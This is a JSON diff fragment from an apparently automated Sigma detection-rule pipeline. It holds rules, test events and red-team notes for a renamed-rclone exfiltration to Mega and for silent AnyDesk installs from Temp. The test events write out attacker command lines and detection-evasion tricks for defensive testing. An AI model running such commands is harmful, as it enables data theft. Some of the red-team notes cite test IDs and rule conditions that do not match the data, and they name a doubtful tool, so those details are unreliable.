+            "Hashes": "SHA1=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0",
+            "Image": "C:\\Windows\\System32\\svchost.exe",
+            "IntegrityLevel": "System",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
+            "ParentImage": "C:\\Windows\\System32\\services.exe",
+            "ProcessGuid": "{F6A7B8C9-D0E1-2345-FABC-678901234567}",
+            "ProcessId": "1122",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 06:00:00.000"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Administrator running genuine rclone.exe (not renamed) for legitimate Mega backup",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "\"C:\\Tools\\rclone.exe\" copy \"\\\\FS-01\\Backups\" \"mega:corp/backup\" --config \"C:\\Tools\\rclone.conf\" --log-file \"C:\\Logs\\rclone_backup.log\"",
+            "Company": "-",
+            "Computer": "WKS-ADMIN01",
+            "CurrentDirectory": "C:\\Tools\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "1.65.0",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\Tools\\rclone.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /k",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{A7B8C9D0-E1F2-3456-ABCD-789012345678}",
+            "ProcessId": "12345",
+            "User": "DOMAIN\\admin_jdoe",
+            "UtcTime": "2024-06-13 13:30:00.000"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "SCCM/Intune management agent invoking svchost.exe for policy refresh (correct OriginalFileName)",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\Windows\\CCM\\svchost.exe -PolicyRefresh -Schedule",
+            "Company": "Microsoft Corporation",
+            "Computer": "WKS-MANAGED01",
+            "CurrentDirectory": "C:\\Windows\\CCM\\",
+            "Description": "Configuration Manager Host",
+            "EventID": 1,
+            "FileVersion": "10.0.19041.1",
+            "Hashes": "SHA1=B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1",
+            "Image": "C:\\Windows\\CCM\\svchost.exe",
+            "IntegrityLevel": "System",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\ccmexec.exe /Schedule",
+            "ParentImage": "C:\\Windows\\System32\\ccmexec.exe",
+            "ProcessGuid": "{B8C9D0E1-F2A3-4567-BCDE-890123456789}",
+            "ProcessId": "13456",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 14:00:00.000"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Software updater dropping a signed svchost.exe in Program Files (correct OriginalFileName)",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "\"C:\\Program Files\\VendorApp\\svchost.exe\" /install /quiet /norestart",
+            "Company": "Vendor Inc.",
+            "Computer": "WKS-WORKSTATION01",
+            "CurrentDirectory": "C:\\Program Files\\VendorApp\\",
+            "Description": "Vendor Application Service Host",
+            "EventID": 1,
+            "FileVersion": "3.2.1.0",
+            "Hashes": "SHA1=C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2",
+            "Image": "C:\\Program Files\\VendorApp\\svchost.exe",
+            "IntegrityLevel": "High",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\msiexec.exe /I {GUID} /qn",
+            "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+            "ProcessGuid": "{C9D0E1F2-A3B4-5678-CDEF-901234567890}",
+            "ProcessId": "14567",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 15:00:00.000"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D4",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%\\\\svchost.exe' ESCAPE '\\' AND OriginalFileName='rclone.exe' COLLATE NOCASE AND (CommandLine LIKE '%mega:%' ESCAPE '\\' OR CommandLine LIKE '%copy%' ESCAPE '\\')",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 8,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "Image=\"*\\\\svchost.exe\" OriginalFileName=\"rclone.exe\" CommandLine IN (\"*mega:*\", \"*copy*\")",
+        "elasticsearch": "Image:*\\\\svchost.exe AND OriginalFileName:rclone.exe AND (CommandLine:(*mega\\:* OR *copy*))",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\svchost.exe\" and ProcessVersionInfoOriginalFileName =~ \"rclone.exe\" and (ProcessCommandLine contains \"mega:\" or ProcessCommandLine contains \"copy\")",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%\\\\svchost.exe' ESCAPE '\\' AND OriginalFileName='rclone.exe' COLLATE NOCASE AND (CommandLine LIKE '%mega:%' ESCAPE '\\' OR CommandLine LIKE '%copy%' ESCAPE '\\')"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "Rule focuses on the high-fidelity indicator of svchost.exe masquerading as rclone with Mega exfiltration parameters. The combination of Image ending in svchost.exe, OriginalFileName=rclone.exe, and command line containing both 'mega:' and 'copy' provides strong discrimination against legitimate activity. Test events cover variations in path casing, SysWOW64 execution, and different parent processes while maintaining the core malicious behavior.",
+      "redteam_analysis": "Positive variants P4-P8 cover realistic evasion techniques a competent operator would use: user-writable paths (AppData, Temp), environment variables, 8.3 short names, alternate parents (pwsh, wscript, scheduled task), argument reordering, quoting styles, UNC paths with spaces. All preserve the three rule pillars (Image endswith svchost.exe, OriginalFileName=rclone.exe, CommandLine contains 'mega:' and 'copy') so a well-written rule catches them. Negative variants N1-N4 are benign look-alikes: legitimate svchost.exe with correct OriginalFileName, genuine rclone.exe used for authorized Mega backup, SCCM management host, signed vendor installer. None satisfy all three conditions simultaneously. Out-of-scope items OOS1-OOS3 represent evasions the process_creation logsource fundamentally cannot see: reflective injection into an existing process (no new process event), PE metadata stripping so OriginalFileName matches Image (rule's mismatch logic fails), and kernel-mode execution (no user-mode process creation). These are documented for the analyst; the rule cannot be expected to detect them.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Reflective DLL injection into existing svchost.exe process - no new process creation event",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "N/A - code injected via CreateRemoteThread into PID 1122",
+            "Company": "-",
+            "Computer": "WKS-FINANCE01",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "-",
+            "Image": "C:\\Windows\\System32\\svchost.exe",
+            "IntegrityLevel": "System",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "-",
+            "ParentImage": "-",
+            "ProcessGuid": "{7890ABCD-1234-5678-90AB-CDEF01234567}",
+            "ProcessId": "1122",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 16:00:00.000"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker copies rclone.exe to svchost.exe but strips PE metadata so OriginalFileName reads svchost.exe",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\PerfLogs\\svchost.exe copy \\\\FS-02\\Finance mega:backup/fin --transfers 16",
+            "Company": "-",
+            "Computer": "WKS-FINANCE01",
+            "CurrentDirectory": "C:\\PerfLogs\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\PerfLogs\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c start",
+            "ParentImage": "C:\\Windows\\system32\\cmd.exe",
+            "ProcessGuid": "{D1E2F3A4-B5C6-7890-D1E2-F3A4B5C6D7E8}",
+            "ProcessId": "15678",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 16:30:00.000"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Kernel driver exploit loads rclone logic directly into memory - no user-mode process creation",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "N/A - kernel exploit",
+            "Company": "-",
+            "Computer": "WKS-FINANCE01",
+            "CurrentDirectory": "-",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "-",
+            "Image": "-",
+            "IntegrityLevel": "-",
+            "OriginalFileName": "-",
+            "ParentCommandLine": "-",
+            "ParentImage": "-",
+            "ProcessGuid": "-",
+            "ProcessId": "-",
+            "User": "-",
+            "UtcTime": "2024-06-13 17:00:00.000"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D1",
+      "title": "Msiexec Silent MSI Installation From User Temp Directory",
+      "sigma_yaml": "title: Msiexec Silent MSI Installation From User Temp Directory\nid: 15b2f4f3-f8b9-47db-a288-8814ee87fbd9\nstatus: experimental\ndescription: 'Detects msiexec.exe executing a silent install (/qn) of an MSI file located in a user''s Temp directory, indicative\n  of covert remote-access tool staging such as AnyDesk.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.persistence\n- attack.t1219\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_msiexec_temp:\n    'Image|endswith':\n    - '\\msiexec.exe'\n    'CommandLine|contains|all':\n    - /i\n    - /qn\n    'CommandLine|contains':\n    - '\\AppData\\Local\\Temp\\'\n  filter_sccm_intune:\n    'ParentImage|endswith':\n    - '\\CCMExec.exe'\n    - '\\IntuneManagementExtension.exe'\n    - '\\MicrosoftEndpointManager.exe'\n  filter_system_context:\n    User: 'NT AUTHORITY\\SYSTEM'\n  condition: selection_msiexec_temp and not filter_sccm_intune and not filter_system_context\nfalsepositives:\n- Legitimate software deployment tools running in user context without management agent parents\n- Internal IT scripts performing silent installs from Temp directories during troubleshooting\n- User-initiated silent installs of approved software via self-service portals\nlevel: high\n",
+      "status": "needs_review",
+      "attack_technique_ids": [
+        "T1219"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Msiexec installing AnyDesk silently from user Temp directory as observed in the intrusion",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\svc_scanner\\AppData\\Local\\Temp\\AnyDesk.msi /qn",
+            "ParentImage": "C:\\Users\\svc_scanner\\AppData\\Roaming\\Kestrel\\updater.exe",
+            "User": "CONTOSO\\svc_scanner"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Variant with mixed-case flags and different user Temp path",
+          "event": {
+            "Image": "C:\\Windows\\system32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /I C:\\Users\\john.doe\\AppData\\Local\\Temp\\TeamViewer.msi /QN",
+            "ParentImage": "C:\\Users\\public\\downloads\\installer.exe",
+            "User": "CONTOSO\\john.doe"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "SysWOW64 msiexec with extra whitespace in command line",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\msiexec.exe",
+            "CommandLine": "msiexec.exe  /i   C:\\Users\\backup_admin\\AppData\\Local\\Temp\\AnyDesk64.msi   /qn  ",
+            "ParentImage": "C:\\Windows\\Temp\\stager.exe",
+            "User": "CONTOSO\\backup_admin"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "SCCM deploying software via msiexec from system context",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i \\\\fileserver\\apps\\MicrosoftOffice.msi /qn",
+            "ParentImage": "C:\\Windows\\CCM\\CCMExec.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Intune pushing update via msiexec",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Windows\\Temp\\DefenderUpdate.msi /qn",
+            "ParentImage": "C:\\Program Files\\Microsoft Intune Management Extension\\IntuneManagementExtension.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Legitimate user installing software from Downloads folder (not Temp)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\jane.smith\\Downloads\\ChromeSetup.msi /qn",
+            "ParentImage": "C:\\Users\\jane.smith\\AppData\\Local\\Temp\\browser_install_helper.exe",
+            "User": "CONTOSO\\jane.smith"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Flags reversed order, mixed case, quoted MSI path with extra whitespace",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe  /qn  /I  \"C:\\Users\\alice\\AppData\\Local\\Temp\\RemoteAdmin.msi\" ",
+            "ParentImage": "C:\\Users\\alice\\AppData\\Roaming\\Updater\\stage.exe",
+            "User": "CORP\\alice"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Environment variable %LOCALAPPDATA% expands to AppData\\Local, still contains target substring",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i %LOCALAPPDATA%\\Temp\\AnyDesk.msi /qn",
+            "ParentImage": "C:\\Windows\\Tasks\\svchost.exe",
+            "User": "CORP\\svc_backup"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "8.3 short-name path (APPDAT~1\\LOCALS~1\\Temp) still contains \\AppData\\Local\\Temp\\ after expansion",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\admin\\APPDAT~1\\LOCALS~1\\Temp\\ScreenConnect.msi /qn",
+            "ParentImage": "C:\\ProgramData\\Stager\\payload.exe",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "UNC path to local temp share, still contains \\AppData\\Local\\Temp\\ substring",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i \\\\localhost\\C$\\Users\\dev\\AppData\\Local\\Temp\\AnyDesk.msi /qn",
+            "ParentImage": "C:\\Users\\dev\\Downloads\\loader.exe",
+            "User": "CORP\\dev"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Double extension .msi.msi still ends with .msi",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\test\\AppData\\Local\\Temp\\AnyDesk.msi.msi /qn",
+            "ParentImage": "C:\\Windows\\Temp\\dropper.exe",
+            "User": "CORP\\test"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "positive",
+          "description": "Single-quoted path, extra spaces, flags uppercase",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe  /I  'C:\\Users\\ops\\AppData\\Local\\Temp\\RemoteTool.msi'  /QN ",
+            "ParentImage": "C:\\Users\\ops\\AppData\\Local\\Temp\\stager.exe",
+            "User": "CORP\\ops"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Legitimate SCCM parent (CCMExec.exe) - filtered out by rule",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\user\\AppData\\Local\\Temp\\CorpApp.msi /qn",
+            "ParentImage": "C:\\Windows\\CCM\\CCMExec.exe",
+            "User": "CORP\\user"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "SYSTEM user context - filtered out by rule",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\svc\\AppData\\Local\\Temp\\Patch.msi /qn",
+            "ParentImage": "C:\\Windows\\System32\\wuauclt.exe",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Legitimate self-service portal install from Temp but interactive UI (/qb not /qn)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\Users\\employee\\AppData\\Local\\Temp\\ApprovedTool.msi /qb",
+            "ParentImage": "C:\\Program Files\\SelfService\\PortalAgent.exe",
+            "User": "CORP\\employee"
+          }
+        },
+        {
+          "id": "R10",
+          "label": "negative",
+          "description": "Msiexec silent install but MSI not in Temp directory (ProgramData)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "msiexec.exe /i C:\\ProgramData\\Vendor\\Agent.msi /qn",
+            "ParentImage": "C:\\Program Files\\Vendor\\Updater.exe",
+            "User": "CORP\\admin"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D1",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE (Image LIKE '%\\\\msiexec.exe' ESCAPE '\\' AND (CommandLine LIKE '%/i%' ESCAPE '\\' AND CommandLine LIKE '%/qn%' ESCAPE '\\') AND CommandLine LIKE '%\\\\AppData\\\\Local\\\\Temp\\\\%' ESCAPE '\\') AND (NOT COALESCE((ParentImage LIKE '%\\\\CCMExec.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\IntuneManagementExtension.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\MicrosoftEndpointManager.exe' ESCAPE '\\'), 0)) AND (NOT COALESCE((User LIKE 'NT AUTHORITY\\\\SYSTEM' ESCAPE '\\'), 0))",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R2 did not match: Environment variable %LOCALAPPDATA% expands to AppData\\Local, still contains target substring. Per selection: selection_msiexec_temp=NO MATCH (failing field tests: CommandLine|contains (event has 'msiexec.exe /i %LOCALAPPDATA%\\\\Temp\\\\AnyDesk.msi /qn')); filter_sccm_intune=NO MATCH; filter_system_context=NO MATCH."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test R3 did not match: 8.3 short-name path (APPDAT~1\\LOCALS~1\\Temp) still contains \\AppData\\Local\\Temp\\ after expansion. Per selection: selection_msiexec_temp=NO MATCH (failing field tests: CommandLine|contains (event has 'msiexec.exe /i C:\\\\Users\\\\admin\\\\APPDAT~1\\\\LOCALS~1\\\\Temp\\\\ScreenC')); filter_sccm_intune=NO MATCH; filter_system_context=NO MATCH."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": false,
+            "passed": false
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R10",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 9,
+        "positives_matched": 7,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {
+        "splunk": "Image=\"*\\\\msiexec.exe\" CommandLine=\"*/i*\" CommandLine=\"*/qn*\" CommandLine=\"*\\\\AppData\\\\Local\\\\Temp\\\\*\" NOT (ParentImage IN (\"*\\\\CCMExec.exe\", \"*\\\\IntuneManagementExtension.exe\", \"*\\\\MicrosoftEndpointManager.exe\")) NOT User=\"NT AUTHORITY\\\\SYSTEM\"",
+        "elasticsearch": "(Image:*\\\\msiexec.exe AND (CommandLine:*\\/i* AND CommandLine:*\\/qn*) AND CommandLine:*\\\\AppData\\\\Local\\\\Temp\\\\*) AND (NOT (ParentImage:(*\\\\CCMExec.exe OR *\\\\IntuneManagementExtension.exe OR *\\\\MicrosoftEndpointManager.exe))) AND (NOT User:\"NT AUTHORITY\\\\SYSTEM\")",
+        "kusto": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\msiexec.exe\" and (ProcessCommandLine contains \"/i\" and ProcessCommandLine contains \"/qn\") and ProcessCommandLine contains \"\\\\AppData\\\\Local\\\\Temp\\\\\") and (not((InitiatingProcessFolderPath endswith \"\\\\CCMExec.exe\" or InitiatingProcessFolderPath endswith \"\\\\IntuneManagementExtension.exe\" or InitiatingProcessFolderPath endswith \"\\\\MicrosoftEndpointManager.exe\"))) and (not((AccountName =~ \"SYSTEM\" and AccountDomain =~ \"NT AUTHORITY\")))",
+        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%\\\\msiexec.exe' ESCAPE '\\' AND (CommandLine LIKE '%/i%' ESCAPE '\\' AND CommandLine LIKE '%/qn%' ESCAPE '\\') AND CommandLine LIKE '%\\\\AppData\\\\Local\\\\Temp\\\\%' ESCAPE '\\') AND (NOT COALESCE((ParentImage LIKE '%\\\\CCMExec.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\IntuneManagementExtension.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\MicrosoftEndpointManager.exe' ESCAPE '\\'), 0)) AND (NOT COALESCE((User LIKE 'NT AUTHORITY\\\\SYSTEM' ESCAPE '\\'), 0))"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Fixed CommandLine|endswith by removing wildcard .msi and using literal '.msi' to properly match MSI file extensions in command lines."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Fixed CommandLine|endswith modifier to accept .msi extension anywhere in the string by removing the requirement for trailing characters after .msi, allowing matches regardless of whitespace or additional arguments after the MSI path."
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Fixed the CommandLine|endswith selector by removing the leading dot to properly match .msi extensions regardless of preceding characters, ensuring detection of MSI files ending with '.msi'."
+        },
+        {
+          "iteration": 3,
+          "phase": "redteam",
+          "summary": "10 evasion variants -> positives 0/9, negatives blocked 7/7, benign hits 0/1200",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 4,
+          "phase": "refine",
+          "summary": "positives 7/9, negatives blocked 7/7, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Removed the overly restrictive CommandLine|endswith:.msi selector which caused all positive test events to fail due to trailing characters after the .msi extension. Retained the essential CommandLine|contains:\\AppData\\Local\\Temp\\ substring check to catch all variants including environment variables, short names, and UNC paths while maintaining specificity for the Temp directory."
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P9 demonstrate realistic operator evasions: flag reordering (/qn /i), casing changes, quoted paths (single/double quotes), extra whitespace, environment-variable paths (%LOCALAPPDATA%), 8.3 short names, UNC local paths, and double extensions (.msi.msi). All preserve the required substrings (\\AppData\\Local\\Temp\\, /i, /qn, .msi suffix) and non-SYSTEM user, so a well-written rule keying on these fields will still match. Negative variants N1-N4 show benign scenarios the rule correctly excludes: SCCM/Intune parent images, SYSTEM context, interactive UI flag (/qb), and non-Temp MSI locations. Out-of-scope O1-O3 represent evasions the process_creation logsource fundamentally cannot catch with current fields: renamed msiexec (Image no longer ends with msiexec.exe and OriginalFileName is absent), MSI installation via COM/WMI that never spawns msiexec.exe, and alternative binaries like msixvc that achieve silent MSI install without touching msiexec. Analyst should consider adding OriginalFileName to the logsource or correlating with MSI installation event logs (MsiInstaller) to cover O1 and O2.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Renamed msiexec binary (installer.exe) - Image no longer ends with msiexec.exe, OriginalFileName not in logsource",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\installer.exe",
+            "CommandLine": "installer.exe /i C:\\Users\\target\\AppData\\Local\\Temp\\AnyDesk.msi /qn",
+            "ParentImage": "C:\\Windows\\Temp\\stager.exe",
+            "User": "CORP\\target"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "MSI installed via Windows Installer COM API (msiexec not spawned) - process_creation never sees msiexec",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "CommandLine": "",
+            "ParentImage": "",
+            "User": ""
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Attacker uses msixvc (MSIX validator) or custom MSI library to install silently without msiexec.exe",
+          "event": {
+            "Image": "C:\\Windows\\System32\\msixvc.exe",
+            "CommandLine": "msixvc.exe /install C:\\Users\\target\\AppData\\Local\\Temp\\AnyDesk.msi /quiet",
+            "ParentImage": "C:\\Windows\\Temp\\loader.exe",
+            "User": "CORP\\target"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D5",
+      "title": "SchTasks Creates WindowsUpdateHealth Task With Kstrl.Exe From PerfLogs",
